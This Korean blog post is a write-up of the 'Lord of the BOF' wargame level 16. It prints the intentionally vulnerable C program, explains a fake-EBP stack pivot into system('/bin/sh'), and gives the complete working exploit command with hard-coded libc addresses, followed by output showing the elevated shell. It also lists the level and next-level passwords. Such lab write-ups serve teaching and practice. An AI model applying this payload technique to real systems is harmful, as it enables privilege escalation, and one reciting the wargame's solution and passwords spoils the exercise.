---
layout: post
title: "[Wargame] 해커스쿨 LEVEL16 (Assassin -> Zombie_assassin) : Fake Ebp"
date: 2015-11-30 22:03:10
category: wargame
tags:  bof 
---

- id = assassin
- pw = pushing me away

<!--more--> 

## 1. 문제 : zombie_assassin.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - zombie_assassin
        - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        // strncpy instead of strcpy!
        strncpy(buffer, argv[1], 48);
        printf("%s\n", buffer);
}
```

### 1.1 변경된 코드

buffer overflow 를 위한 strcpy() 가 이번에는 strncpy(X,X,48)로서 48bytes = buffer[40] + sfr[4] + lr[4] 만큼만 copy 를 한다.

```c
// strncpy instead of strcpy!
strncpy(buffer, argv[1], 48);
```

## 2. 공격 준비

(Level12 도 그랬지만… EBP 를 이용한 공격에 익숙하지 않아서 그런지… 처음에는 너무 어려웠지만… 참 재밌는 문제다…)

### 2.1 공격 방법 고민

이번 문제에서는 ret() 만 하고 오면 되었는데, 이번에는 LR 뒤 값을 copy 할 수 없다. 즉, stack 을 원하는대로 구성을 할 수 없다는 것이다. 그럼 어떻게 공격할 수 있을까 ? 그럼 모든 공격 코드를 ROP 로 작성해야할까 ?

다행히… 힌트가 있다. fake ebp. 12단계 : (Golem -> Darkknight) : Sfp와 같이 ebp 를 crash 한 다음에 흐름을 바꾸어야 하는 것 같다.

### 2.2 Stack 구성

```
[ Buffer[40] ][ SFR ][ LR ][ ...]
= [4Bytes][ system() ][ exit() ][ /bin/sh ][NOP 28Bytes][ SFR ][ leave() ]
     /|\                                                    |
      |-----------------------------------------------------|

- system() : 0x40058ae0
- exit()   : 0x400391e0
- /bin/sh  : 0x400fbff9
- NOP
- SFR
- leave()  : 0x080484df

./zombie_assassin "`python -c 'print "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40" + "\x90"*28 + "\x4c\xfc\xff\xbf" + "\xdf\x84\x04\x08"'`"
```

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage16-1.png)

## 3 Exploit

```bash
./zombie_assassin "`python -c 'print "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40" + "\x90"*28 + "\x4c\xfc\xff\xbf" + "\xdf\x84\x04\x08"'`"   
à@à@ù¿@Lü ¿ß

bash$ id
uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
```

## 4. 다음 단계 정보

```bash
bash$ id
uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)

bash$ my-pass
euid = 516
no place to hide
```

